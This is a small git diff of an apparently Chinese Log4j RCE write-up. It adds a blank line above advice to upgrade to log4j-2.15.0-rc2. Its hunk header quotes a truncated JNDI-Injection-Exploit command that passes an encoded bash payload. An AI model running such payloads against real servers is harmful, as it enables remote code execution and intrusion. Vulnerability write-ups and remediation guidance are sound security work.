@@ -59,6 +59,7 @@ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAt
 ![image](https://github.com/rabbitsafe/Apache-Log4j_RCE/blob/main/9.png)  
 
 0x5：漏洞修复建议
+
 1、升级Apache Log4j2组件到最新版本（log4j-2.15.0-rc2）：
 https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2
 2、其他缓解措施：
